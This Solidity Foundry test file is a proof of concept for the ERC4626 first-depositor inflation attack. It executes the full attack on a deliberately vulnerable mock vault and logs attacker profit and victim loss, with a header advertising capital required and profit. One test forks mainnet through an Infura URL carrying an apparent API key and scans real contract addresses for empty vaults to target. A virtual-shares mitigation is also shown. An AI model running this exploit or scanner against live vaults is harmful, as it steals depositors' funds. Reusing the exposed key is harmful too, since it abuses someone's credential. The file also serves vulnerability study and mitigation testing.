// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title First Depositor Inflation Attack POC
 * @notice Demonstrates ERC4626-style vault inflation attacks
 *
 * VULNERABILITY PATTERN:
 * When a vault is empty (totalSupply = 0), the first depositor can:
 * 1. Deposit 1 wei → receive 1 share
 * 2. Donate large amount directly to vault
 * 3. Victim deposits → receives 0 shares due to rounding
 * 4. Attacker withdraws → takes victim's deposit
 *
 * REAL EXPLOITS:
 * - ResupplyFi: $9.56M (June 2025)
 * - Venus wUSDM: $717K (Feb 2025)
 * - Wise Finance: Multiple incidents
 *
 * CAPITAL REQUIRED: ~$100-1000 + gas
 * PROFIT: Up to 50% of victim deposits
 */
contract FirstDepositorInflationPOC is Test {

    // Mock ERC4626 vault for demonstration
    MockVulnerableVault vault;
    MockERC20 underlying;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint256 constant DONATION_AMOUNT = 100_000e18; // 100k tokens
    uint256 constant VICTIM_DEPOSIT = 99_999e18;   // Just under donation

    function setUp() public {
        // Deploy mock contracts
        underlying = new MockERC20("Underlying", "UND");
        vault = new MockVulnerableVault(address(underlying));

        // Fund attacker and victim
        underlying.mint(attacker, DONATION_AMOUNT + 1);
        underlying.mint(victim, VICTIM_DEPOSIT);
    }

    /**
     * @notice Demonstrates the complete attack on an EMPTY vault
     */
    function test_firstDepositorAttack() public {
        console.log("========== FIRST DEPOSITOR ATTACK POC ==========");
        console.log("");
        console.log("Vault:", address(vault));
        console.log("Underlying:", address(underlying));
        console.log("");

        // STEP 0: Verify vault is empty
        console.log("=== STEP 0: Initial State ===");
        console.log("Vault totalSupply:", vault.totalSupply());
        console.log("Vault totalAssets:", vault.totalAssets());
        require(vault.totalSupply() == 0, "Vault must be empty");
        console.log("");

        // STEP 1: Attacker deposits 1 wei
        console.log("=== STEP 1: Attacker deposits 1 wei ===");
        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        uint256 attackerShares = vault.deposit(1, attacker);
        vm.stopPrank();

        console.log("Attacker deposited: 1 wei");
        console.log("Attacker shares received:", attackerShares);
        console.log("Vault totalSupply:", vault.totalSupply());
        console.log("Vault totalAssets:", vault.totalAssets());
        console.log("");

        // STEP 2: Attacker donates tokens directly to vault
        console.log("=== STEP 2: Attacker donates to inflate share price ===");
        vm.prank(attacker);
        underlying.transfer(address(vault), DONATION_AMOUNT);

        console.log("Attacker donated:", DONATION_AMOUNT / 1e18, "tokens");
        console.log("Vault totalSupply:", vault.totalSupply(), "(unchanged)");
        console.log("Vault totalAssets:", vault.totalAssets() / 1e18, "tokens");

        // Calculate inflated share price
        uint256 pricePerShare = vault.totalAssets() * 1e18 / vault.totalSupply();
        console.log("Price per share:", pricePerShare / 1e18, "tokens");
        console.log("");

        // STEP 3: Victim deposits (gets 0 shares!)
        console.log("=== STEP 3: Victim deposits ===");

        // Preview how many shares victim would get
        uint256 previewShares = vault.previewDeposit(VICTIM_DEPOSIT);
        console.log("Victim wants to deposit:", VICTIM_DEPOSIT / 1e18, "tokens");
        console.log("Preview shares (expected):", previewShares);

        vm.startPrank(victim);
        underlying.approve(address(vault), type(uint256).max);
        uint256 victimShares = vault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        console.log("Victim shares received:", victimShares);
        console.log("");

        if (victimShares == 0) {
            console.log("!!! VULNERABILITY CONFIRMED !!!");
            console.log("Victim received 0 shares for", VICTIM_DEPOSIT / 1e18, "tokens!");
            console.log("");
        }

        // STEP 4: Attacker withdraws everything
        console.log("=== STEP 4: Attacker withdraws ===");
        console.log("Vault totalAssets before:", vault.totalAssets() / 1e18);
        console.log("Attacker shares:", vault.balanceOf(attacker));

        vm.startPrank(attacker);
        uint256 attackerWithdraw = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        vm.stopPrank();

        console.log("Attacker withdrew:", attackerWithdraw / 1e18, "tokens");
        console.log("");

        // STEP 5: Calculate profit/loss
        console.log("=== RESULTS ===");
        uint256 attackerFinal = underlying.balanceOf(attacker);
        uint256 victimFinal = underlying.balanceOf(victim);

        console.log("Attacker started with:", (DONATION_AMOUNT + 1) / 1e18, "tokens");
        console.log("Attacker ended with:", attackerFinal / 1e18, "tokens");

        int256 attackerPNL = int256(attackerFinal) - int256(DONATION_AMOUNT + 1);
        console.log("Attacker P&L:", attackerPNL / 1e18, "tokens");

        console.log("");
        console.log("Victim started with:", VICTIM_DEPOSIT / 1e18, "tokens");
        console.log("Victim ended with:", victimFinal / 1e18, "tokens");
        console.log("Victim LOST:", (VICTIM_DEPOSIT - victimFinal) / 1e18, "tokens");

        console.log("");
        console.log("====================================================");
    }

    /**
     * @notice Shows the math behind share calculation
     */
    function test_shareCalculationMath() public view {
        console.log("========== SHARE CALCULATION MATH ==========");
        console.log("");

        console.log("Standard ERC4626 formula:");
        console.log("  shares = depositAmount * totalSupply / totalAssets");
        console.log("");

        console.log("When vault is empty (totalSupply = 0):");
        console.log("  shares = depositAmount (1:1 ratio)");
        console.log("");

        console.log("After donation attack:");
        console.log("  totalSupply = 1");
        console.log("  totalAssets = 100,001 (1 + 100,000 donation)");
        console.log("  victim deposits 99,999");
        console.log("  shares = 99,999 * 1 / 100,001 = 0 (integer division!)");
        console.log("");

        console.log("The victim needs to deposit MORE than totalAssets");
        console.log("to receive even 1 share.");
        console.log("");

        console.log("====================================================");
    }

    /**
     * @notice Test against REAL mainnet vault if empty
     */
    function test_scanForEmptyVaults() public {
        console.log("========== SCANNING FOR EMPTY VAULTS ==========");
        console.log("");

        // Fork mainnet
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");

        // Check Yearn V1 yDAI (from contracts.txt - known low TVL)
        address yDAI = 0x16de59092dae5ccf4a1e6439d611fd0653f0bd01;

        console.log("Checking Yearn V1 yDAI:", yDAI);

        // Check totalSupply
        (bool success, bytes memory data) = yDAI.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success && data.length >= 32) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("  totalSupply:", supply / 1e18);

            if (supply == 0) {
                console.log("  !!! VAULT IS EMPTY - VULNERABLE TO FIRST DEPOSITOR !!!");
            } else if (supply < 1000e18) {
                console.log("  WARNING: Very low supply - may be vulnerable to donation");
            }
        }

        // Check balance
        (success, data) = yDAI.staticcall(
            abi.encodeWithSignature("balance()")
        );
        if (success && data.length >= 32) {
            uint256 bal = abi.decode(data, (uint256));
            console.log("  balance:", bal / 1e18);
        }

        // Check pricePerShare
        (success, data) = yDAI.staticcall(
            abi.encodeWithSignature("getPricePerFullShare()")
        );
        if (success && data.length >= 32) {
            uint256 pps = abi.decode(data, (uint256));
            console.log("  pricePerShare:", pps / 1e18);
        }

        console.log("");

        // Check other vaults from contracts.txt
        address[] memory potentialVaults = new address[](5);
        potentialVaults[0] = 0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4; // EarlyAdopterPool
        potentialVaults[1] = 0x4f6a43ad7cba042606decaca730d4ce0a57ac62e; // Saddle BTC
        potentialVaults[2] = 0xc5cfada84e902ad92dd40194f0883ad49639b023; // Curve GUSD Gauge
        potentialVaults[3] = 0xface851a4921ce59e912d19329929ce6da6eb0c7; // cLINK
        potentialVaults[4] = 0x7fcb7dac61ee35b3d4a51117a7c58d53f0a8a670; // DOLA

        for (uint i = 0; i < potentialVaults.length; i++) {
            _checkVaultState(potentialVaults[i]);
        }

        console.log("====================================================");
    }

    function _checkVaultState(address vaultAddr) internal view {
        uint256 codeSize;
        assembly { codeSize := extcodesize(vaultAddr) }
        if (codeSize == 0) return;

        console.log("Checking:", vaultAddr);

        // Try totalSupply
        (bool success, bytes memory data) = vaultAddr.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success && data.length >= 32) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("  totalSupply:", supply / 1e18);

            if (supply == 0) {
                console.log("  >>> EMPTY VAULT - FIRST DEPOSITOR VULNERABLE <<<");
            }
        }

        // Try to get balance/totalAssets
        (success, data) = vaultAddr.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (success && data.length >= 32) {
            console.log("  totalAssets:", abi.decode(data, (uint256)) / 1e18);
        }

        console.log("");
    }

    /**
     * @notice Test mitigation: Virtual shares
     */
    function test_virtualSharesMitigation() public {
        console.log("========== VIRTUAL SHARES MITIGATION ==========");
        console.log("");

        // Deploy protected vault
        MockProtectedVault protectedVault = new MockProtectedVault(address(underlying));

        // Fund attacker
        underlying.mint(attacker, DONATION_AMOUNT + 1);
        underlying.mint(victim, VICTIM_DEPOSIT);

        // Try same attack
        vm.startPrank(attacker);
        underlying.approve(address(protectedVault), type(uint256).max);
        protectedVault.deposit(1, attacker);
        underlying.transfer(address(protectedVault), DONATION_AMOUNT);
        vm.stopPrank();

        console.log("After attacker deposits 1 wei + donates 100k:");
        console.log("  totalSupply (with virtual):", protectedVault.totalSupply() + protectedVault.VIRTUAL_SHARES());
        console.log("  totalAssets (with virtual):", protectedVault.totalAssets() + protectedVault.VIRTUAL_ASSETS());

        // Victim deposits
        vm.startPrank(victim);
        underlying.approve(address(protectedVault), type(uint256).max);
        uint256 victimShares = protectedVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        console.log("");
        console.log("Victim deposited:", VICTIM_DEPOSIT / 1e18);
        console.log("Victim shares received:", victimShares);

        if (victimShares > 0) {
            console.log("");
            console.log("MITIGATION SUCCESSFUL: Victim received shares!");
            console.log("Virtual shares prevent the inflation attack.");
        }

        console.log("");
        console.log("====================================================");
    }
}

// ============ MOCK CONTRACTS ============

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/**
 * @notice VULNERABLE vault - no protection
 */
contract MockVulnerableVault {
    MockERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address _asset) {
        asset = MockERC20(_asset);
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function previewDeposit(uint256 assets) public view returns (uint256) {
        if (totalSupply == 0) return assets;
        return assets * totalSupply / totalAssets();
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = previewDeposit(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(balanceOf[owner] >= shares, "insufficient shares");
        assets = shares * totalAssets() / totalSupply;
        totalSupply -= shares;
        balanceOf[owner] -= shares;
        asset.transfer(receiver, assets);
    }
}

/**
 * @notice PROTECTED vault - with virtual shares (OpenZeppelin pattern)
 */
contract MockProtectedVault {
    MockERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    // Virtual shares/assets to prevent inflation attack
    uint256 public constant VIRTUAL_SHARES = 1e8;  // 10^8 virtual shares
    uint256 public constant VIRTUAL_ASSETS = 1e8;  // 10^8 virtual assets

    constructor(address _asset) {
        asset = MockERC20(_asset);
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function previewDeposit(uint256 assets) public view returns (uint256) {
        // Add virtual offset to prevent division manipulation
        return assets * (totalSupply + VIRTUAL_SHARES) / (totalAssets() + VIRTUAL_ASSETS);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = previewDeposit(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(balanceOf[owner] >= shares, "insufficient shares");
        assets = shares * (totalAssets() + VIRTUAL_ASSETS) / (totalSupply + VIRTUAL_SHARES);
        totalSupply -= shares;
        balanceOf[owner] -= shares;
        asset.transfer(receiver, assets);
    }
}
